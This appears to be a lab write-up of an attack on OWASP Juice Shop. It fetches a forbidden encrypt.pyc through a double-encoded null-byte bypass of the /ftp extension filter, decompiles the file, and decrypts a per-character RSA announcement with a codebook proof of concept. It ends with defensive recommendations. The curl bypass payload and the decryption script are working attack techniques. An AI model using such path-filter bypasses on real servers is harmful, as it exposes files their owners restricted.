# c09 — `encrypt.pyc` retrieval & reverse engineering

**Engagement:** c09-pyc-reverse
**Target:** OWASP Juice Shop @ `http://host.docker.internal:3000` (lab)
**Date:** 2026-10-18
**Artifact:** `/ftp/encrypt.pyc` (573 bytes, md5 `7bda83d9a3e0a17393067074498f6b18`)

---

## 1. TL;DR

`encrypt.pyc` is a compiled **CPython 2.7** module (`encrypt.py`, compiled 2020-05-20 20:46:26).
It reads the plaintext file `announcement.md`, RSA-encrypts it **one character at a time** using a
hard-coded 1024-bit modulus `N` and exponent `e = 65537`, and writes one decimal ciphertext per
line to `announcement_encrypted.md`.

The scheme is textbook (unpadded, deterministic) RSA applied to individual characters, so it is
completely reversible: the plaintext alphabet is tiny (0–255), which lets anyone build a
codebook `pow(c, e, N)` for every possible character and decrypt the whole document **without
factoring N**. Doing exactly that recovered the confidential 1194-character announcement in full
(0 unknown characters, byte-exact round-trip verification).

Additionally, the `.pyc` itself was reachable only by defeating Juice Shop's `/ftp` extension
filter with a double-encoded null byte, and it leaks the "secret" RSA public key (`N`, `e`) to
anyone who downloads it.

---

## 2. Getting the file (filter bypass)

`/ftp/` is a directory listing served by `serve-index` + a custom `verify()` in
`build/routes/fileServer.js` that only allows `.md` and `.pdf`:

```
$ curl -s -o encrypt.pyc http://host.docker.internal:3000/ftp/encrypt.pyc
HTTP/1.1 403 Forbidden
<h2><em>403</em> Error: Only .md and .pdf files are allowed!</h2>
   at verify (/juice-shop/build/routes/fileServer.js:68:18)
```

The check is applied to the (partially decoded) request path, while the file is later resolved
from a second decode — so a **double URL-encoded NUL** makes the path end in `.md` for the
validator but point to the raw `.pyc` on disk:

```
$ curl -s -o encrypt.pyc 'http://host.docker.internal:3000/ftp/encrypt.pyc%2500.md'
HTTP/1.1 200 OK
Accept-Ranges: bytes
ETag: W/"23d-1a13097c458"
Content-Type: application/octet-stream
Content-Length: 573
```

(Control tests: `%00.md` → 400, plain `.md`/`.pdf` suffixes → 404. The same trick works for the
other non-md/pdf loot in `/ftp`, e.g. `coupons_2013.md.bak`, `package.json.bak`,
`incident-support.kdbx`.)

---

## 3. Identifying the bytecode

```
03 f3 0d 0a 22 97 c5 5e ...
└─ magic ─┘ └─ mtime ─┘
```

| Field | Value | Meaning |
|---|---|---|
| magic (LE u16) | `0xf303` = **62211** | CPython **2.7** bytecode |
| mtime (LE u32) | `1590007586` | 2020-05-20 20:46:26 UTC |
| size | 573 bytes | one module-level code object |

Because it is 2.7 bytecode (not the newer PEP 552 header with a 4-byte bit field), the header is
just `magic || mtime` followed directly by a marshalled code object. `uncompyle6 3.9.3` (which
still supports 2.7) decompiled it cleanly; `xdis`/`pydisasm` produced the matching opcode
listing.

---

## 4. Decompiled source

```python
# uncompyle6 version 3.9.3
# Python bytecode version base 2.7 (62211)
# Embedded file name: encrypt.py
# Compiled at: 2020-05-20 20:46:26
confidential_document = open('announcement.md', 'r')
N = 145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053L
e = 65537
encrypted_document = open('announcement_encrypted.md', 'w')
for char in confidential_document.read():
    encrypted_document.write(str(pow(ord(char), e, N)) + '\n')

encrypted_document.close()
return   # <- decompiler artifact: the module's implicit RETURN_VALUE, not real source
```

**Disassembly corroboration** (excerpt) — confirms the same semantics at opcode level:

```
  1:  LOAD_NAME open; LOAD_CONST 'announcement.md'; LOAD_CONST 'r'; CALL_FUNCTION 2; STORE_NAME confidential_document
  4:  LOAD_CONST <big int>; STORE_NAME N
  5:  LOAD_CONST 65537;     STORE_NAME e
  7:  LOAD_NAME open; LOAD_CONST 'announcement_encrypted.md'; LOAD_CONST 'w'; CALL_FUNCTION 2; STORE_NAME encrypted_document
 10:  SETUP_LOOP ->106; LOAD_NAME confidential_document; LOAD_ATTR read; CALL_FUNCTION 0; GET_ITER
 11:  FOR_ITER ->105; STORE_NAME char
      LOAD_NAME encrypted_document; LOAD_ATTR write
      LOAD_NAME str; LOAD_NAME pow; LOAD_NAME ord; LOAD_NAME char; CALL_FUNCTION 1   # ord(char)
      LOAD_NAME e; LOAD_NAME N; CALL_FUNCTION 3                                       # pow(..., e, N)
      CALL_FUNCTION 1                                                                 # str(...)
      LOAD_CONST '\n'; BINARY_ADD; CALL_FUNCTION 1; POP_TOP; JUMP_ABSOLUTE
 14:  LOAD_NAME encrypted_document; LOAD_ATTR close; ...
```

The `LOAD_CONST <big int>` / `STORE_NAME N` pair, `ord()` → 3-arg `pow()` → `str()` + `'\n'`
inside `FOR_ITER`, is the entire algorithm.

---

## 5. What it does, in plain words

1. Opens `announcement.md` for reading (the "confidential document").
2. Defines hard-coded RSA parameters: modulus `N` (309-digit / 1024-bit) and public exponent
   `e = 65537`. Note there is **no private key, no padding, no IV, no salt** in the script.
3. Opens/creates `announcement_encrypted.md` for writing.
4. For **each character** of the document:
   * `ord(char)` → its code point (0–255),
   * `pow(code, 65537, N)` → RSA-encrypt that single character numerically,
   * writes the decimal integer followed by `\n`.
5. Closes the output file.

So it is not a stream/file cipher at all — it is a per-character RSA substitution, producing a
file with one huge decimal number per plaintext character (hence 1194 lines for a 1194-character
message). The companion file `/ftp/announcement_encrypted.md` is the output of exactly this code.

---

## 6. Why it's broken (crypto analysis)

* **No padding (textbook RSA).** Identical plaintext characters produce identical ciphertext
  lines: the ciphertext is deterministic and leaks the exact frequency/position pattern of the
  original text.
* **Tiny plaintext space.** Plaintext is a single byte, so there are at most 256 possible
  messages. An attacker builds the full codebook `c ↦ c^e mod N` (256 modular exponentiations,
  milliseconds) and decrypts by lookup — **no private key, no factoring of N required**.
  This is the classic "small message space" attack on raw RSA.
* **Security by obscurity.** Shipping the "encryption tool" plus a public key to a public
  `/ftp` folder means the key material is public; a `.pyc` is trivially decompiled back to
  source, so the algorithm itself is not secret either.
* **Broken access control on the file server.** The `.md`/`.pdf` whitelist is enforced on a
  non-canonical path (double-encoded NUL bypass), so arbitrary files in `/ftp` — including this
  `.pyc`, `coupons_2013.md.bak`, `package.json.bak`, `incident-support.kdbx` — are downloadable.

---

## 7. Proof of concept — decryption without the key

PoC: `/workspace/pocs/c9_decrypt_announcement.py`

```python
N = 1459...740053   # 1024-bit modulus from the .pyc
e = 65537
# ciphertext lines are c^e mod N for a single character c -> build reverse lookup
codebook = {pow(c, e, N): c for c in range(256)}
for line in open('announcement_encrypted.md'):
    plaintext += chr(codebook[int(line)])
```

Run:

```
$ python3 pocs/c9_decrypt_announcement.py loot/announcement_encrypted.md
[*] recovered 1194 chars, 0 misses
------------------------------------------------------------------------------
Major Announcement:

Token Sale - Initial Coin Offering

Lorem ipsum dolor sit amet, ... Give us all your money. ...
URL: /#/tokensale-ico-ea
```

Verification that the model of the program is correct (and not just a plausible plaintext):

```
round-trip verified: 1194/1194 lines == pow(ord(plain[i]), 65537, N)
```

i.e. re-encrypting every recovered character with the hard-coded key reproduces
`announcement_encrypted.md` line for line. Full plaintext saved to
`loot/announcement_recovered.md`; it advertises the Juice Shop token-sale easter-egg route
`/#/tokensale-ico-ea`, which is itself a useful hint for further app exploration.

---

## 8. Artifacts (in `/workspace`)

| File | Description | md5 |
|---|---|---|
| `loot/encrypt.pyc` | original 573-byte Python 2.7 bytecode pulled via the bypass | `7bda83d9a3e0a17393067074498f6b18` |
| `loot/encrypt_decompiled.py` | `uncompyle6` output (source) | `0d6d2ccca76de484baafe3a28842777c` |
| `loot/announcement_encrypted.md` | ciphertext companion (1194 decimal lines) | `034a8cabcaab13796222fa9b327f097b` |
| `loot/announcement_recovered.md` | recovered plaintext | `9506b8abda56e449bba69d2397ec0c1a` |
| `pocs/c9_decrypt_announcement.py` | codebook decryption PoC (executed) | — |

Key material observed in the module:
* `N` = 145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053
* `e` = 65537

---

## 9. Recommendations

1. Never ship encryption keys/tooling in a publicly served directory; treat `.pyc`, `.bak`,
   `.kdbx` files as sensitive and exclude them from the static root.
2. Canonicalize and decode-fully-then-validate paths before the extension check (block NUL and
   repeated/ambiguous encodings); serve an explicit allow-list of filenames, not extensions.
3. Do not use raw RSA for data: use a vetted AEAD (AES-GCM / libsodium) with a real KDF, and
   never encrypt data one character at a time.
4. Assume any client-delivered code (`.pyc`/JS/APK) is fully readable — obfuscation is not
   confidentiality.
